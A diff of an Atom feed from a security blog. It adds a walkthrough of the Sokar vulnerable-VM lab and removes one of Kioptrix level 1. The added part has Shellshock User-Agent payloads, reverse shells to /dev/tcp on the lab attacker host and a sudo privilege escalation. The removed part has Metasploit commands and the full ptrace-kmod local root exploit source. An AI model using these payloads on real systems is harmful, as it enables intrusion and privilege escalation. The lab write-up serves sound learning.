@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-11T15:06:30-05:00</updated>
+  <updated>2016-07-15T13:18:24-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,134 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-sokar]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/15/vulhub-sokar/"/>
+    <updated>2016-07-15T10:27:33-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/15/vulhub-sokar</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Nikto</li>
+<li>User Agent Switcher</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.103 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.56.103 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 591 is opening, looks like it is running http service.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.56.103:591</code></p>
+
+<p>nothing cool.</p>
+
+<p>Use wufzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>find an interesting path <code>cgi-bin</code>. Thats interesting, because it reminds shellshock.</p>
+
+<p>Use brower to check the web page</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>The web page shows result of commands <code>netstat</code> and <code>iostat</code>.</p>
+
+<p>check the source code find the cgi path <code>/cgi-bin/cat</code></p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>start to verfiy shellshock:</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sokar/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Confirmed.Also find two user names <code>bynarr</code> and <code>apophis</code></p>
+
+<p>I tried to upload reverse shell</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.56.102/4444 0&lt;&amp;1" "http://192.168.56.103:591/cgi-bin/cat"
+</code></pre>
+
+<p>failed. I guess because certain ports are allowed.</p>
+
+<p>keep going&hellip;</p>
+
+<p>check the files belong to bynarr:</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"
+</code></pre>
+
+<p><img src="/images/blog/vulhub/sokar/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Try to read each file I got, and find the <code>va/spool/mail/bynarr</code> is very interesting.</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>so now I know I can only use port 51242 to setup reverse shell.</p>
+
+<p>Also I noticed that <code>.</code> is in environment variable <code>$PATH</code>, so that I can run a script in the current path firstly.</p>
+
+<p>write the reverse shell to iostat:</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.102/51242 0&gt;&amp;1' &gt; /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
+</code></pre>
+
+<p>add the x attribute</p>
+
+<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
+</code></pre>
+
+<p>After serverl seconds I got shell:</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>next run <code>sudo -l</code> to check allowed commands for bynarr</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>so /home/bynarr/lime which is owned by root that bynarr can run.</p>
+
+<p>in order to check shell shock locally. run:</p>
+
+<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>
+
+<p>local shell shock works</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>from the <code>sudo -l</code> output, there are many environment variables can be used. I ued USERNAME</p>
+
+<p><code>sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/sokar/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kioptrix2014 (#5)]]></title>
@@ -750,311 +878,6 @@ Nmap done: 1 IP address (1 host up) scanned in 37.28 seconds
 <p>Upload it to the target, compile and run it. ROOT:</p>
 
 <p><img src="/images/blog/vulhub/kioptrix2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Vulhub-Kioptrix level 1]]></title>
-    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
-    <updated>2016-06-06T09:21:18-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
-    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
-
-<h3>Tools:</h3>
-
-<ul>
-<li>netdiscover</li>
-<li>Nmap</li>
-<li>nbtscab</li>
-<li>enum4linux</li>
-<li>Metasploit</li>
-<li>Nikto</li>
-</ul>
-
-
-<!--more-->
-
-
-<p>Use netdiscover to detect target IP address</p>
-
-<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>192.168.79.182 is the target.</p>
-
-<p>Then run nmap to detect opening ports and running services on the target machine.</p>
-
-<p><code>nmap -sV -v -O -A -T5 192.168.79.182 -p-</code></p>
-
-<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>SMB Attack:</p>
-
-<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
-
-<p><code>nbtscan 192.168.79.182</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>use enum4linux to enumerate smb:</p>
-
-<p><code>enum4linux  -a 192.168.79.182</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>get the samba version</p>
-
-<p>Now start Metasploit:</p>
-
-<pre><code>msfconsole
-search samba
-use exploit/linux/samba/trans2open
-set rhost 192.168.79.182
-set payload generic/shell_reverse_tcp
-exploit
-</code></pre>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>DONE SMB</p>
-
-<p>mod_ssl exploit:</p>
-
-<p>use nikto to scan:</p>
-
-<p><code>nikto -h 192.168.79.182</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Looks like mod_ssl is vulnerable</p>
-
-<p>search exploits:</p>
-
-<p><code>searchexploit openssl</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>now try to compile the c code. Get error. Find a <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">blog</a> to fix it.</p>
-
-<p>now recompile:</p>
-
-<p><code>
-gcc 764.c -o 764 -lcrypto
-</code></p>
-
-<p>run the 764 and it requires to input id for the target&rsquo;s supported box eg: 0x00. In the result of nikto, the box is Apache/1.3.20 (Unix)  (Red-Hat/Linux)</p>
-
-<p>so I can just:</p>
-
-<p><code>./764 -h |grep 1.3.20</code></p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>so we can just 0x6a and 0x0b. Finially got 0x0b works</p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>I get the shell, but still not get the root. After analysis, I figure it out that code 764.c download ptrace-kmod.c. compile and execute it. I didn&rsquo;t connect my vm to Internet, so it failed when it tried to download the code. Finally I get the ptrace-kmod.c</p>
-
-<pre><code class="c ptrace-kmod.c">/*
- * Linux kernel ptrace/kmod local root exploit
- *
- * This code exploits a race condition in kernel/kmod.c, which creates
- * kernel thread in insecure manner. This bug allows to ptrace cloned
- * process, allowing to take control over privileged modprobe binary.
- *
- * Should work under all current 2.2.x and 2.4.x kernels.
- * 
- * I discovered this stupid bug independently on January 25, 2003, that
- * is (almost) two month before it was fixed and published by Red Hat
- * and others.
- * 
- * Wojciech Purczynski &lt;cliph@isec.pl&gt;
- *
- * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
- * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
- * 
- * (c) 2003 Copyright by iSEC Security Research
- */
-
-#include &lt;grp.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;fcntl.h&gt;
-#include &lt;errno.h&gt;
-#include &lt;paths.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;signal.h&gt;
-#include &lt;unistd.h&gt;
-#include &lt;sys/wait.h&gt;
-#include &lt;sys/stat.h&gt;
-#include &lt;sys/param.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;sys/ptrace.h&gt;
-#include &lt;sys/socket.h&gt;
-#include &lt;linux/user.h&gt;
-
-char cliphcode[] =
-    "\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
-    "\x00\x5b\x31\xc9\x89\xca\xcd\x80"
-    "\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
-    "\x00\x00\xcd\x80\x89\xd0\x89\xd3"
-    "\x40\xcd\x80\xe8\xdc\xff\xff\xff";
-
-#define CODE_SIZE (sizeof(cliphcode) - 1)
-
-pid_t parent = 1;
-pid_t child = 1;
-pid_t victim = 1;
-volatile int gotchild = 0;
-
-void fatal(char * msg)
-{
-    perror(msg);
-    kill(parent, SIGKILL);
-    kill(child, SIGKILL);
-    kill(victim, SIGKILL);
-}
-
-void putcode(unsigned long * dst)
-{
-    char buf[MAXPATHLEN + CODE_SIZE];
-    unsigned long * src;
-    int i, len;
-
-    memcpy(buf, cliphcode, CODE_SIZE);
-    len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
-    if (len == -1)
-        fatal("[-] Unable to read /proc/self/exe");
-
-    len += CODE_SIZE + 1;
-    buf[len] = '\0';
-
-    src = (unsigned long*) buf;
-    for (i = 0; i &lt; len; i += 4)
-        if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
-            fatal("[-] Unable to write shellcode");
-}
-
-void sigchld(int signo)
-{
-    struct user_regs_struct regs;
-
-    if (gotchild++ == 0)
-        return;
-
-    fprintf(stderr, "[+] Signal caught\n");
-
-    if (ptrace(PTRACE_GETREGS, victim, NULL, &amp;regs) == -1)
-        fatal("[-] Unable to read registers");
-
-    fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
-
-    putcode((unsigned long *)regs.eip);
-
-    fprintf(stderr, "[+] Now wait for suid shell...\n");
-
-    if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
-        fatal("[-] Unable to detach from victim");
-
-    exit(0);
-}
-
-void sigalrm(int signo)
-{
-    errno = ECANCELED;
-    fatal("[-] Fatal error");
-}
-
-void do_child(void)
-{
-    int err;
-
-    child = getpid();
-    victim = child + 1;
-
-    signal(SIGCHLD, sigchld);
-
-    do
-        err = ptrace(PTRACE_ATTACH, victim, 0, 0);
-    while (err == -1 &amp;&amp; errno == ESRCH);
-
-    if (err == -1)
-        fatal("[-] Unable to attach");
-
-    fprintf(stderr, "[+] Attached to %d\n", victim);
-    while (!gotchild) ;
-    if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
-        fatal("[-] Unable to setup syscall trace");
-    fprintf(stderr, "[+] Waiting for signal\n");
-
-    for(;;);
-}
-
-void do_parent(char * progname)
-{
-    struct stat st;
-    int err;
-    errno = 0;
-    socket(AF_SECURITY, SOCK_STREAM, 1);
-    do {
-        err = stat(progname, &amp;st);
-    } while (err == 0 &amp;&amp; (st.st_mode &amp; S_ISUID) != S_ISUID);
-
-    if (err == -1)
-        fatal("[-] Unable to stat myself");
-
-    alarm(0);
-    system(progname);
-}
-
-void prepare(void)
-{
-    if (geteuid() == 0) {
-        initgroups("root", 0);
-        setgid(0);
-        setuid(0);
-        execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
-        fatal("[-] Unable to spawn shell");
-    }
-}
-
-int main(int argc, char ** argv)
-{
-    prepare();
-    signal(SIGALRM, sigalrm);
-    alarm(10);
-
-    parent = getpid();
-    child = fork();
-    victim = child + 1;
-
-    if (child == -1)
-        fatal("[-] Unable to fork");
-
-    if (child == 0)
-        do_child();
-    else
-        do_parent(argv[0]);
-
-    return 0;
-}
-</code></pre>
-
-<p>in target vm /tmp:</p>
-
-<p><code>wget http://192.168.79.173/ptrace-kmod.c</code></p>
-
-<p>&lsquo;gcc ptrace-kmod.c -o attack&rsquo;</p>
-
-<p>run attack:</p>
-
-<p><img src="/images/blog/vulhub/kioptrix1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE</p>
 ]]></content>
